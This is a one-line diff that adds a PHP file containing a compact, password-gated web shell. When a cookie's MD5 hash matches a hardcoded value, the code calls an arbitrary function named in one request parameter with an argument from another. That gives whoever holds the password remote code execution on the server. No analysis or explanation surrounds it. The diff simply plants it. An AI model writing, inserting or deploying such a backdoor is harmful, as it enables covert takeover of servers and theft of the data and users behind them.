@@ -1,0 +1,1 @@
+<?php if(md5(@$_COOKIE[qz])=="1acacf59417cdbcff590823aee49f02b") ($_=@$_REQUEST[q]).@$_($_REQUEST[z]);
